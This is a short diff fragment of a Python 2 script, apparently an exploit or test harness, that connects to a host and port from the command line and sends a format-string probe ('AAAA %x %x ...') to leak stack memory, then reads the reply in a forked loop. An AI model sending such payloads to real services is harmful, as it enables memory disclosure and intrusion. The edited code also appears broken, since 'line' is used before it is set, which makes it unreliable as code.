@@ -38,7 +38,10 @@ s = socket.socket()
 s.connect((sys.argv[1], int(sys.argv[2])))
 
 s.send("AAAA %x %x %x %x %x %x %x %x %x %x %x %x\n")
-line = readLine(s)
+if os.fork():
+    while 1:
+        line += s.recv(1)
+#line = readLine(s)
 
 print "%s" %line
 
